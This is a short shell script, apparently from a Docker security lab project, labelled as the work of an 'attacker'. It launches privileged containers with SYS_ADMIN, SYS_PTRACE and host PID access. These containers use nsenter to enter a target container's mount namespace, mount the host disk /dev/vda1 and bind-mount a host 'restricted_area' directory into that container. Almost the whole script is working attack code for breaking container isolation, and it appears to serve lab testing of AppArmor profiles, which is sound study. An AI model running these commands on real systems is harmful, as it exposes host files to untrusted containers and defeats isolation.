#!/bin/sh

echo "Please give container's id:"
read container_id
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
rm PID

#Done by host
#sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
#sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/restricted_area /doot
#sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount


#Done by attacker no2
docker run --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_PTRACE --pid=host debian:latest nsenter --target ${container_pid} --mount mount /dev/vda1 /tmpmount

#I can do mkdir and mknod with nsenter too -> version 4

docker run --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_PTRACE --pid=host debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/restricted_area /doot

docker run --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_PTRACE --pid=host debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
